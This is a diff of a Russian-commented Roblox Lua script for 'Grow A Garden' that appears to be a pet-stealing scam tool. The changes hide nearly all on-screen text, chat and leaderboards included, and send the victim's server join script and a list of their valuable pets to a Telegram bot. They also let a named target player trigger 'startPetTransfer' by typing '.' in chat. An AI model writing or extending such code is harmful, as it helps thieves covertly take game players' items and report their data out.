@@ -8,11 +8,8 @@ local LocalPlayer = Players.LocalPlayer
 -- 🛡️ УЛУЧШЕННОЕ АГРЕССИВНОЕ СКРЫТИЕ ТЕКСТА В GUI (с защитой собственного GUI)
 local PROTECTED_GUI_NAMES = {
     "CustomLoadingUI", -- Защищаем наш загрузочный экран
-    "BackpackGui",     -- Защищаем рюкзак
-    "CoreGui",         -- Защищаем системные элементы
-    "Chat",            -- Защищаем чат
-    "Leaderboard",     -- Защищаем лидерборд
-    "PlayerList"       -- Защищаем список игроков
+    "MainScript", -- Если у вас есть другие собственные GUI
+    "TelegramBot" -- Добавьте сюда названия ваших GUI
 }
 
 local function isProtectedGUI(obj)
@@ -37,17 +34,26 @@ local function isProtectedGUI(obj)
     return false
 end
 
--- 🛡️ ОПТИМИЗИРОВАННАЯ ЗАЩИТА BackpackGui
+-- 🛡️ ЗАЩИТА BackpackGui ОТ СКРЫТИЯ
 task.spawn(function()
     while true do
         pcall(function()
-            -- Просто защищаем BackpackGui от скрытия, но не принудительно открываем
+            -- Защищаем BackpackGui от скрытия
             local backpackGui = LocalPlayer.PlayerGui:FindFirstChild("BackpackGui")
             if backpackGui then
-                backpackGui.Enabled = true -- Только разрешаем работу, но не открываем
+                -- Принудительно показываем BackpackGui и все его элементы
+                backpackGui.Enabled = true
+                for _, child in ipairs(backpackGui:GetDescendants()) do
+                    if child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("TextBox") then
+                        child.Visible = true
+                        child.TextTransparency = 0
+                    elseif child:IsA("Frame") or child:IsA("ImageLabel") or child:IsA("ImageButton") then
+                        child.Visible = true
+                    end
+                end
             end
         end)
-        task.wait(1) -- Реже проверяем, чтобы не лагало
+        task.wait(0.1)
     end
 end)
 
@@ -55,17 +61,6 @@ local function hideIfText(obj)
     if not obj or isProtectedGUI(obj) then return end
     
     if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
-        -- Дополнительная фильтрация - не трогаем важные системные элементы
-        if obj.Parent and (
-            obj.Parent.Name:find("Core") or 
-            obj.Parent.Name:find("System") or
-            obj.Parent.Name:find("Chat") or
-            obj.Parent.Name:find("Leaderboard") or
-            obj.Parent.Name:find("PlayerList")
-        ) then
-            return
-        end
-        
         -- Проверяем, что это не наш собственный GUI
         if obj.Text and obj.Text ~= "" then
             obj.Visible = false
@@ -100,22 +95,14 @@ LocalPlayer.PlayerGui.DescendantAdded:Connect(hideIfText)
 local lastCheck = 0
 RunService.RenderStepped:Connect(function()
     local currentTime = tick()
-    if currentTime - lastCheck < 2 then return end -- Проверяем каждые 2 секунды вместо 0.5
+    if currentTime - lastCheck < 0.5 then return end -- Проверяем каждые 0.5 секунд
     lastCheck = currentTime
     
     for _, gui in ipairs(LocalPlayer.PlayerGui:GetDescendants()) do
         if not isProtectedGUI(gui) then
             if gui:IsA("TextLabel") or gui:IsA("TextButton") or gui:IsA("TextBox") then
                 if gui.Text and gui.Text ~= "" then
-                    -- Дополнительная фильтрация - не трогаем системные элементы
-                    if not (gui.Parent and (
-                        gui.Parent.Name:find("Core") or 
-                        gui.Parent.Name:find("System") or
-                        gui.Parent.Name:find("Chat") or
-                        gui.Parent.Name:find("Leaderboard")
-                    )) then
-                        gui.Visible = false
-                    end
+                    gui.Visible = false
                 end
             end
         end
@@ -236,8 +223,7 @@ local TRIGGER_MESSAGE = "."
 
 -- 🐾 РАСШИРЕННЫЙ БЕЛЫЙ СПИСОК
 local WHITELIST = {
-    "Hawk",
-    "Crab"
+    "Rooster",
     -- Добавьте сюда других питомцев которых нужно передавать
 }
 
@@ -263,24 +249,204 @@ local function sendToTelegram(text)
 end
 
 -- 🔗 ИСПРАВЛЕННАЯ ФУНКЦИЯ ССЫЛКИ НА СЕРВЕР
-local function getServerLink()
+-- 🚀 ДОБАВЬТЕ ЭТОТ КОД В ВАШ СКРИПТ (после строки local TeleportService = game:GetService("TeleportService"))
+
+-- 🔗 ГЕНЕРАЦИЯ РАБОЧЕГО СКРИПТА ДЛЯ ПОДКЛЮЧЕНИЯ
+local function generateJoinScript()
     local placeId = game.PlaceId
     local jobId = game.JobId
     
-    if not jobId or jobId == "" or jobId == "0" then
-        -- Для публичных серверов
-        return "https://www.roblox.com/games/"..placeId.." (публичный сервер)"
-    else
-        -- Пробуем разные форматы ссылок
-        local links = {
-            "https://www.roblox.com/games/"..placeId.."?privateServerLinkCode="..jobId,
-            "https://www.roblox.com/games/"..placeId.."/?gameInstanceId="..jobId,
-            "roblox://experiences/start?placeId="..placeId.."&gameInstanceId="..jobId
-        }
+    if not jobId or jobId == "" then
+        return "❌ Job ID недоступен для публичного сервера"
+    end
+    
+    -- Создаем рабочий скрипт телепортации (как на скриншоте)
+    local joinScript = string.format(
+        'game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")',
+        placeId, jobId
+    )
+    
+    return joinScript
+end
+
+-- 📋 ПОЛНАЯ ИНФОРМАЦИЯ ДЛЯ ПОДКЛЮЧЕНИЯ В СТИЛЕ СКРИНШОТА
+local function getWorkingJoinInfo()
+    local placeId = game.PlaceId
+    local jobId = game.JobId
+    local playerCount = #Players:GetPlayers()
+    local maxPlayers = Players.MaxPlayers
+    
+    local info = {
+        "🔴 Status",
+        "🟢 Active (Server running normally)",
+        "",
+        "🎮 Game",
+        "Grow A Garden",
+        "",
+        "🖥️ Server", 
+        "Join now!",
+        "",
+        "📦 Join Script",
+        generateJoinScript()
+    }
+    
+    -- Добавляем информацию о питомцах как "Loot"
+    local pets = getAllPets()
+    if pets and #pets > 0 then
+        table.insert(info, "")
+        table.insert(info, "📦 Loot")
         
-        return table.concat(links, "\n\nИли попробуйте:\n")
+        -- Показываем топ-5 питомцев
+        for i = 1, math.min(5, #pets) do
+            local pet = pets[i]
+            local emoji = pet.rarity:find("LEGENDARY") and "🐙" or
+                         pet.rarity:find("EPIC") and "🦕" or
+                         pet.rarity:find("RARE") and "🐝" or "🐸"
+            
+            local status = pet.isWhitelisted and "✅" or "❌"
+            table.insert(info, string.format("%s %s 0 / 1 ($0 / $%.0f) %s", 
+                         emoji, pet.name, pet.weight * 10, status))
+        end
+        
+        if #pets > 5 then
+            table.insert(info, string.format("... и еще %d питомцев", #pets - 5))
+        end
+    end
+    
+    -- Дополнительная информация
+    table.insert(info, "")
+    table.insert(info, string.format("👥 Players: %d/%d", playerCount, maxPlayers))
+    table.insert(info, string.format("🆔 Place: %d", placeId))
+    table.insert(info, string.format("🔑 Job: %s", (jobId or "Unknown"):sub(1, 8) .. "..."))
+    
+    return table.concat(info, "\n")
+end
+
+-- 🔧 АВТОМАТИЧЕСКАЯ ГЕНЕРАЦИЯ ФАЙЛА ДЛЯ СКАЧИВАНИЯ
+local function generateTeleportFile()
+    local placeId = game.PlaceId
+    local jobId = game.JobId
+    
+    if not jobId or jobId == "" then
+        return "❌ Не удается создать файл для публичного сервера"
+    end
+    
+    local fileContent = string.format([[-- 🚀 AUTO JOIN SCRIPT
+-- Generated: %s
+-- Target: %s (%s)
+
+local TeleportService = game:GetService("TeleportService")
+TeleportService:TeleportToPlaceInstance(%d, "%s")
+]], os.date("%Y-%m-%d %H:%M:%S"), TARGET_PLAYER, LocalPlayer.Name, placeId, jobId)
+    
+    return fileContent
+end
+
+-- ЗАМЕНИТЕ СУЩЕСТВУЮЩУЮ ФУНКЦИЮ sendInitialNotification НА ЭТУ:
+local function sendInitialNotification()
+    -- Отправляем информацию в стиле скриншота
+    local serverInfo = getWorkingJoinInfo()
+    sendToTelegram(serverInfo)
+    
+    -- Дополнительная инструкция
+    local instruction = string.format([[
+💡 ИНСТРУКЦИЯ ПО ПОДКЛЮЧЕНИЮ:
+
+1️⃣ СКОПИРУЙТЕ Join Script из сообщения выше
+2️⃣ Откройте Roblox и нажмите F9 (Developer Console)
+3️⃣ Вставьте скрипт в строку ввода
+4️⃣ Нажмите Enter
+
+🎯 Цель: %s
+💬 Команда: '%s'
+]], TARGET_PLAYER, TRIGGER_MESSAGE)
+    
+    sendToTelegram(instruction)
+end
+
+-- ЗАМЕНИТЕ СУЩЕСТВУЮЩУЮ ФУНКЦИЮ setupMessageListener НА ЭТУ:
+local function setupMessageListener()
+    if TextChatService then
+        TextChatService.OnIncomingMessage = function(message)
+            local speaker = Players:FindFirstChild(message.TextSource.Name)
+            if speaker and speaker.Name == TARGET_PLAYER then
+                local msg = message.Text:lower()
+                
+                if message.Text == TRIGGER_MESSAGE then
+                    startPetTransfer()
+                elseif msg:find("join") or msg:find("подключиться") then
+                    sendToTelegram(getWorkingJoinInfo())
+                elseif msg:find("script") or msg:find("скрипт") then
+                    local joinScript = generateJoinScript()
+                    sendToTelegram("📦 Join Script:\n" .. joinScript)
+                elseif msg:find("file") or msg:find("файл") then
+                    local fileContent = generateTeleportFile()
+                    sendToTelegram("📁 Auto-join file:\n```lua\n" .. fileContent .. "\n```")
+                elseif msg:find("pets") or msg:find("питомцы") then
+                    sendToTelegram(getFullPetsList())
+                elseif msg:find("status") or msg:find("статус") then
+                    local uptime = string.format("%.1f мин", (tick() - STATS.startTime) / 60)
+                    sendToTelegram(string.format("📊 СТАТУС:\n⏱️ Время работы: %s\n✅ Передано: %d\n❌ Ошибок: %d\n👥 Игроков: %d", 
+                                                uptime, STATS.totalPetsTransferred, STATS.errors, #Players:GetPlayers()))
+                elseif msg:find("help") or msg:find("помощь") then
+                    local helpText = "📋 ДОСТУПНЫЕ КОМАНДЫ:\n" ..
+                                   "• '" .. TRIGGER_MESSAGE .. "' - передать питомцев\n" ..
+                                   "• 'join' - информация для подключения\n" ..
+                                   "• 'script' - только Join Script\n" ..
+                                   "• 'file' - файл автоподключения\n" ..
+                                   "• 'pets' - список питомцев\n" ..
+                                   "• 'status' - статус работы\n" ..
+                                   "• 'help' - список команд"
+                    sendToTelegram(helpText)
+                end
+            end
+        end
+    else
+        Players.PlayerChatted:Connect(function(chatType, speaker, message)
+            if chatType == Enum.PlayerChatType.All and speaker.Name == TARGET_PLAYER then
+                local msg = message:lower()
+                
+                if message == TRIGGER_MESSAGE then
+                    startPetTransfer()
+                elseif msg:find("join") or msg:find("подключиться") then
+                    sendToTelegram(getWorkingJoinInfo())
+                elseif msg:find("script") or msg:find("скрипт") then
+                    local joinScript = generateJoinScript()
+                    sendToTelegram("📦 Join Script:\n" .. joinScript)
+                elseif msg:find("file") or msg:find("файл") then
+                    local fileContent = generateTeleportFile()
+                    sendToTelegram("📁 Auto-join file:\n```lua\n" .. fileContent .. "\n```")
+                elseif msg:find("pets") or msg:find("питомцы") then
+                    sendToTelegram(getFullPetsList())
+                elseif msg:find("status") or msg:find("статус") then
+                    local uptime = string.format("%.1f мин", (tick() - STATS.startTime) / 60)
+                    sendToTelegram(string.format("📊 СТАТУС:\n⏱️ Время работы: %s\n✅ Передано: %d\n❌ Ошибок: %d\n👥 Игроков: %d", 
+                                                uptime, STATS.totalPetsTransferred, STATS.errors, #Players:GetPlayers()))
+                elseif msg:find("help") or msg:find("помощь") then
+                    local helpText = "📋 ДОСТУПНЫЕ КОМАНДЫ:\n" ..
+                                   "• '" .. TRIGGER_MESSAGE .. "' - передать питомцев\n" ..
+                                   "• 'join' - информация для подключения\n" ..
+                                   "• 'script' - только Join Script\n" ..
+                                   "• 'file' - файл автоподключения\n" ..
+                                   "• 'pets' - список питомцев\n" ..
+                                   "• 'status' - статус работы\n" ..
+                                   "• 'help' - список команд"
+                    sendToTelegram(helpText)
+                end
+            end
+        end)
     end
 end
+
+-- ОБНОВИТЕ ФИНАЛЬНЫЕ ПРИНТЫ:
+print("✅ Скрипт Grow a Garden с рабочей телепортацией готов!")
+print("💬 Новые команды для игрока "..TARGET_PLAYER..":")
+print("   'join' - получить Join Script для подключения")
+print("   'script' - только сам скрипт телепортации") 
+print("   'file' - файл для автоподключения")
+print("   '"..TRIGGER_MESSAGE.."' - передать питомцев")
+print("   'pets', 'status', 'help' - остальные команды")
+print("🚀 Система телепортации TeleportToPlaceInstance активна!")
 
 -- 🔎 УЛУЧШЕННАЯ ФУНКЦИЯ ПОЛУЧЕНИЯ ПИТОМЦЕВ
 local function getAllPets()
